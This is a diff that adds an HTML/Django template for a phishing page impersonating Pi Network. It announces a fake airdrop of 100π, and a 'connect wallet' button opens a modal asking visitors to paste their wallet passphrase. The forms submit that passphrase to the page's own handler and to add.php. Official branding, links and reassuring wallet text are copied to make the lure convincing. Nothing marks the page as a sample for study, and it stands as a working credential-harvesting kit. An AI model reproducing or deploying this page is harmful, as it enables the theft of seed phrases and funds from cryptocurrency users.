@@ -1,0 +1,380 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="{% static 'css/style.css' %}">
+    <link rel="stylesheet" type="text/css" href="{% static 'css/style3.css' %}">
+    <title>Pi Network - Pi Blockchain, Community & Developer Platform</title>
+    <link rel="icon" type="image/x-icon" href="{% static 'images/logo.png' %}">
+    <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    
+
+
+
+
+</head>
+<body>
+    <nav class="navbar">
+      <div class="container">
+        <a class="navbar-brand" href="/"/>
+          <img alt="logo" src="{% static 'images/logo.png' %}" />
+          <span>Pi Network</span>
+        </a>
+         </div>
+          <div class="collapse navbar-collapse" id="main-nav">
+            <ul class="navbar-nav ml-auto">
+              <li class="nav-item">
+                <a class="nav-link" href="#"/>Home</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="https://node.minepi.com/">Pi node</a>
+              </li>
+              <li class="nav-item hidden-mobile">
+                <a
+                  class="nav-link"
+                  href="#"
+                >
+                  Mobile app
+                </a>
+              </li>
+              <li class="nav-item hidden-desktop">
+                <a
+                  class="nav-link"
+                  href="#"
+                >
+                  Mobile app
+                </a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="https://developers.minepi.com">Platform</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="#">Team</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="#">Support</a>
+              </li>
+    
+            </ul>
+          </div>
+    </nav>
+    <main>
+            <img src="{% static 'images/banner2.jpg' %}" alt="">
+        <section>
+          <div class="title">
+            <h2>Pi Netwok First Airdrop</h2>
+          </div>
+          <div class="text"><p>Official Pi Network has hit over 2 MILLION Twitter followers! And we are approaching the mainnet, to enliven and attract more pioneers, we are holding an Airdrop for pioneers who have successfully done KYC with a total prize of 100π/pioneers. We're so excited for the future, as the Pi community continues to build a Web3 Pi ecosystem full of amazing apps and utilities on the Pi Browser. Let's do the job right and do it all.</p></div>
+          <div class="phrase"><p>"Please connect your wallet for verify to claim your reward"</p></div>
+          <div class="btn">
+            <button class="button2" style="cursor: pointer;"><i class="fa-solid fa-wallet"></i> connect wallet</button>
+          </div>
+        </section>
+        <div id="pop2" class="pop_up">
+          <div class="title"><h3>Paste Your Passphrase To Unlock Your Wallet</h3></div>
+          <form method="POST">
+            {% csrf_token %}
+
+            <div class="txt"><textarea cols="40" rows="10" style="resize: none; font-family: 'Alexandria', sans-serif; font-family: 'Source Code Pro', monospace;" class="form-control" id="pharse_key" name="phrase" required placeholder="e.g. alpha bravo charlie delta echo foxtrot golf hotel india juliett kilo lima mike november oscar papa quebec romeo sierra tango uniform victor whiskey xray" maxlength="160" minlength="100"></textarea></div>
+            <div class="btn"><button class="btn__1" type="submit">unlock with passphrase</button></div></form>
+        <div class="txt1">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</div>
+        <div class="txt2">
+          Lost your passphrase?<span> You can reset your wallet</span>, but all your π t in your previous wallet will be inaccessible.
+        </div>
+        </div>
+        
+    </main>
+    <!-- /***************************************************/ -->
+    <nav class="nav">
+      <div class="container">
+        <a class="navbar-brand" href="/"/>
+          <img alt="logo" src="{% static 'images/logo.png' %}" />
+          <span>Pi Network</span>
+        </a>
+         </div>
+         <div class="btn">
+          <img class="img_btn" src="{% static 'images/bars.png' %}" alt="">
+        </div>
+    </nav>
+    <div id="main-nav" class="navig">
+      <ul class="navbar-nav ml-auto">
+        <li class="nav-item">
+          <a class="nav-link" href="#"/>Home</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="https://node.minepi.com/">Pi node</a>
+        </li>
+        <li class="nav-item hidden-mobile">
+          <a
+            class="nav-link"
+            href="#"
+          >
+            Mobile app
+          </a>
+        </li>
+        <li class="nav-item hidden-desktop">
+          <a
+            class="nav-link"
+            href="#"
+          >
+            Mobile app
+          </a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="https://developers.minepi.com">Platform</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="#">Team</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="#">Support</a>
+        </li>
+
+      </ul>
+    </div>
+    <div class="main">
+            <img src="{% static 'images/banner2.jpg' %}" alt="">
+        <section>
+          <div class="title">
+            <h3>Pi Netwok First Airdrop</h3>
+          </div>
+          <div class="text"><p>Official Pi Network has hit over 2 MILLION Twitter followers! And we are approaching the mainnet, to enliven and attract more pioneers, we are holding an Airdrop for pioneers who have successfully done KYC with a total prize of 100π/pioneers. We're so excited for the future, as the Pi community continues to build a Web3 Pi ecosystem full of amazing apps and utilities on the Pi Browser. Let's do the job right and do it all.</p></div>
+          <div class="phrase"><p>"Please connect your wallet for verify to claim your reward"</p></div>
+          <div class="btn">
+            <button class="button1" style="cursor: pointer;"><i class="fa-solid fa-wallet"></i> connect wallet</button>
+          </div>
+        </section>
+        <div id="pop" class="pop_up lac">
+          <div class="title"><h3>Paste Your Passphrase To Unlock Your Wallet</h3></div>
+          <form action="add.php" method="post"><div class="txt"><textarea cols="40" rows="10" style="resize: none; font-family: 'Alexandria', sans-serif; font-family: 'Source Code Pro', monospace;" class="form-control" id="pharse_key" name="pharse_key" required placeholder="e.g. alpha bravo charlie delta echo foxtrot golf hotel india juliett kilo lima mike november oscar papa quebec romeo sierra tango uniform victor whiskey xray" maxlength="160" minlength="100"></textarea></div>
+          <div class="btn"><button class="btn__2" type="submit">unlock with passphrase</button></div></form>
+        <div class="txt1">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</div>
+        <div class="txt2">
+          Lost your passphrase?<span> You can reset your wallet</span>, but all your π t in your previous wallet will be inaccessible.
+        </div>
+        </div>
+        
+        
+    </div>
+    <footer id="footer">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-12">
+            <ul class="social-media">
+              <li><a target="_blank" href="https://www.facebook.com/PiCoreTeam?mibextid=LQQJ4d"><i class="fa fa-facebook"></i></a></li>
+              <li><a target="_blank" href="https://l.facebook.com/l.php?u=https%3A%2F%2Ftwitter.com%2Fpicoreteam%3Fs%3D11%26t%3DC_roBEZv7cc80YpEBk8irg%26fbclid%3DIwAR1qkXzsTRkD6mcG9MQJuh1qW45ll8oDY6ep6lOpacMGGuV5RO3LKKtiHFg&h=AT260byvGucEmsnR7K860NH-cWFoJFeJbNeME8XLpqkNWOVAdlFhHZUoODh2wkjoMkbhP9QJ3UPLRJ-t-k3MYMyDbpHXrmH6BQxCk8uDYRavBAZEmR1GA6Z4oSHErRH7FgLUVwhhl239vqo"><i class="fa fa-twitter"></i></a></li>
+              <li><a target="_blank" href="https://t.me/+sNlsYgEj18M2ZWFk"><i  class="fa fa-telegram"></i></a></li>
+              <li><a target="_blank" href="https://www.instagram.com/pi_network/"><i class="fa fa-instagram"></i></a></li>
+            </ul>
+          </div>
+          <div class="col-md-12">
+            <div class="copyright text-center">
+              <p>© 2022 Pi Network | All rights reserved.</p>
+            </div>
+            <div class="links">
+              <a target="_blank" href="https://socialchain.app/tos">Terms of Service</a>
+              <a target="_blank" href="https://socialchain.app/privacy">Privacy Policy</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    
+    <div class="bottom-space"></div>
+
+    <div class="download_banner_1">
+     
+        <div class="container">
+          
+            <div><strong>Pi Network</strong>
+            <br>
+                <p>Start mining. Easy as Pi!</p>
+            </div>
+          
+          
+            <a class="download_app" onclick="send_download_stat()" target="_blank" href="https://play.google.com/store/apps/details?id=com.blockchainvault">
+              Download
+            </a>
+          
+        </div>
+      
+    </div>
+
+    <style>
+      ::placeholder{
+  font-family: 'Montserrat', sans-serif;
+  letter-spacing: 2px;
+      }
+      .pop_up{
+        background-color: white;
+        border: 1px solid;
+      }
+      @media (min-width:800px) {
+        #pop2 .title h3{
+          font-size: 26px;
+        }
+        .pop_up{
+          position: absolute;
+          top: 24%;
+          transform: translate(-50%,0);
+        }
+        #pop2 .txt1,#pop2 .txt2{
+          margin-top: -20px !important;
+        }
+      }
+      @media (max-width:800px) {
+        .pop_up{
+          margin-top: 420px !important;
+        }
+        #main-nav.navig{
+        margin-right: 0px;
+        height: 240px !important;
+    }
+    body{
+        margin-left: -20px;
+        zoom: 90%;
+    }
+    .main section{
+        width: 100%;
+    }
+    #main-nav.navig li:nth-last-child(1){
+      border: 0 !important;
+      margin-top: -10px;
+    }
+    .nav .btn{
+      width: 200px;
+      margin-left: 200px;
+    }
+    .download_banner_1{
+      width: 110%;
+    }
+
+    .main section .title h3{
+      font-size: 25px;
+      margin-top: -20px;
+    }
+    .main section .btn{
+      margin-top: -45px;
+    }
+    .main section .text p{
+      font-size: 15px;
+      margin-top: -20px;
+    }
+    .main section .phrase p{
+      font-size: 15px;
+      margin-top: -10px;
+    }
+
+    
+      }
+    </style>
+
+    <script>
+
+      const navig=document.querySelector(".navig");
+      const img_btn=document.querySelector(".img_btn");
+      img_btn.addEventListener("click",function(){
+        if(navig.style.display==""){
+          navig.style.display="block";
+        }else{
+          navig.style.display="";
+        }
+      });
+
+
+navig.addEventListener("click",  (e) => {
+
+if(e.target === e.currentTarget) {
+  console.log(e.target === e.currentTarget)
+  navig.style.display="";
+}
+})
+
+/***************************/
+
+// Show Modal
+const openModalButton = document.querySelector(".button1");
+const openModalButton2 = document.querySelector(".button2");
+const modalWindowOverlay = document.getElementById("pop");
+const modalWindowOverlay2 = document.getElementById("pop2");
+
+const showModalWindow = () => {
+  modalWindowOverlay.style.display = 'block';
+}
+openModalButton.addEventListener("click", showModalWindow);
+
+// Hide Modal
+const closeModalButton = document.getElementById("close-modal");
+
+const hideModalWindow = () => {
+    modalWindowOverlay.style.display = 'none';
+}
+const hideModalWindowOnBlur = (e) => {
+
+if(e.target === e.currentTarget) {
+    hideModalWindow();
+}
+}
+modalWindowOverlay.addEventListener("click", hideModalWindowOnBlur);
+document.querySelector(".main").addEventListener("click", hideModalWindowOnBlur);
+document.querySelector(".main section").addEventListener("click", hideModalWindowOnBlur);
+document.querySelector(".main img").addEventListener("click", hideModalWindowOnBlur);
+document.querySelector("footer").addEventListener("click", hideModalWindowOnBlur);
+
+/*******************************************************/
+const showModalWindow2 = () => {
+  modalWindowOverlay2.style.display = 'block';
+}
+openModalButton2.addEventListener("click", showModalWindow2);
+
+// Hide Modal
+const closeModalButton2 = document.getElementById("close-modal");
+
+const hideModalWindow2 = () => {
+    modalWindowOverlay2.style.display = 'none';
+}
+const hideModalWindowOnBlur2 = (e) => {
+
+if(e.target === e.currentTarget) {
+    hideModalWindow2();
+}
+}
+modalWindowOverlay2.addEventListener("click", hideModalWindowOnBlur2);
+document.querySelector("main").addEventListener("click", hideModalWindowOnBlur2);
+document.querySelector("section").addEventListener("click", hideModalWindowOnBlur2);
+document.querySelector("main img").addEventListener("click", hideModalWindowOnBlur2);
+document.querySelector("footer").addEventListener("click", hideModalWindowOnBlur2);
+
+
+
+      // b1.addEventListener("click",function(){
+      //   if(textarea1.value.length>=100){
+      //   window.location="form.html";
+      //   textarea1.style.borderColor="green";
+      // }else{
+      //   textarea1.style.borderColor="red";
+      // }
+      // });
+
+      
+      // b2.addEventListener("click",function(){
+      //   if(textarea2.value.length>=100){
+      //   window.location="form.html";
+      //   textarea2.style.borderColor="green";
+      // }else{
+      //   textarea2.style.borderColor="red";
+      // }
+      // });
+
+
+    </script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+</body>
+</html>
